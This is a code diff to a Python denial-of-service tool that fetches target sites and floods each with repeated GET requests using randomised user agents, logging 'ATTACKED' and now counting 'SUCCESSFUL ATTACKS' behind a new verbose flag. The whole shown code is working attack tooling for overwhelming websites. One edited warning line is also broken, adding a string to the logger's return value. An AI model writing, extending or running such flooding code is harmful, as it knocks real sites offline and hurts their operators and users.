@@ -11,6 +11,7 @@ from time import sleep
 from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
 from json import loads
+from argparse import ArgumentParser
 
 import json
 import sys
@@ -27,6 +28,11 @@ logger.add(
     stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
 threads = int(sys.argv[1])
 
+parser = ArgumentParser()
+parser.add_argument("-v", "--verbose", dest="verbose", action='store_true')
+parser.set_defaults(verbose=False)
+args, unknown = parser.parse_known_args()
+verbose = args.verbose
 
 def checkReq():
     os.system("python3 -m pip install -r requirements.txt")
@@ -81,6 +87,9 @@ def mainth():
         site = unquote(data['site']['page'])
         if site.startswith('http') == False:
             site = "https://" + site
+
+        attacks_number = 0
+
         try:
             attack = scraper.get(site)
             if attack.status_code >= 302:
@@ -91,15 +100,21 @@ def mainth():
                     if response.status_code >= 200 and response.status_code <= 302:
                         for i in range(MAX_REQUESTS):
                             response = scraper.get(site)
-                            logger.info("ATTACKED; RESPONSE CODE: " +
-                                        str(response.status_code))
+                            attacks_number += 1
+                            if verbose:
+                              logger.info("ATTACKED; RESPONSE CODE: " +
+                                          str(response.status_code))
             else:
                 for i in range(MAX_REQUESTS):
                     response = scraper.get(site)
-                    logger.info("ATTACKED; RESPONSE CODE: " +
-                                str(response.status_code))
+                    attacks_number += 1
+                    if verbose:
+                      logger.info("ATTACKED; RESPONSE CODE: " +
+                                  str(response.status_code))
+            if attacks_number > 0:
+              logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
         except:
-            logger.warning("issue happened")
+            logger.warning("issue happened, SUCCESSFUL ATTACKS: ") + str(attacks_number)
             continue
 
 
